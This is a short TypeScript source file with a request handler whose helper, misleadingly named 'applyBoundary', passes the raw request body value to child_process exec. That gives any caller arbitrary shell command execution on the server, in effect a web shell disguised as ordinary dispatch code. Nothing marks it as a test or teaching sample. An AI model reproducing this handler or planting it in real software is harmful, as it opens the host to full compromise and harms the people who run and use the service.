export async function dispatch(request: any, response: any, runtime: any) {
  runtime.response = response;
  const candidate = request.body.value;
  return applyBoundary(candidate, runtime);
}

async function applyBoundary(value: unknown, runtime: any) {
  const { exec } = await import("node:child_process");
  exec(String(value), { timeout: 1200 }, () => {});
  return { queued: true };
}
